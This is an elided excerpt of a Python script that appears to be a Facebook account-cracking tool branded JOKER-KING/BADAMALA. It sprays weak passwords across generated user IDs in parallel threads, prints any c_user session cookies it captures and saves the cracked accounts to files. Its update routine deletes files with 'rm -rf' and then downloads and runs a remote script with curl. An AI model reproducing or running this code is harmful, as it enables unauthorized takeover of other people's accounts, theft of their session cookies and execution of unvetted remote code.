...
\033[1;37m $$ |\$$\    $$ |  $$ |\$$$ |$$ |  $$ |
\033[1;37m $$ | \$$\ $$$$$$\ $$ | \$$ |\$$$$$$  |
\__|  \__|\______|\__|  \__| \_____| \033[1;32m LPC\033[1;37m 
--------------------------------------------------
[•] AUTHOR     : \033[1;32mBADAMALA\033[1;37m
...
try:
    ...
    proxy = requests.get('https://raw.githubusercontent.com/JOKER-KING/BADAMALA/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/JOKER-KING/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/JOKER-KING/jkr/main/jkr.py > jkr.py')
        os.system('python jkr.py')
    else:pass
...
def badamala():
	...
	if gh =='1':
		...
		os.system('xdg-open https://https://www.facebook.com/ubaidkhan')
	elif gh =='0':
...
def menu():
	...
	print('[2] JOKER + KING PASS')
	print('[3] UBAID + KHAN PASS')
...
def ubaid_khan():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mJOKER + KING')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
...
def joker_king():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'joker123','king1122','ubaid786']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	input('Press Inter To Back Menu')
...
def chos():
    ...
    os.system('clear')
    print(logo)
    print('[•] EXAMPLE : khan12345,bangladish,ubaid,Etc')
    lines()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[JOKERKING-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[JOKERKING-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mJOKERKING\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
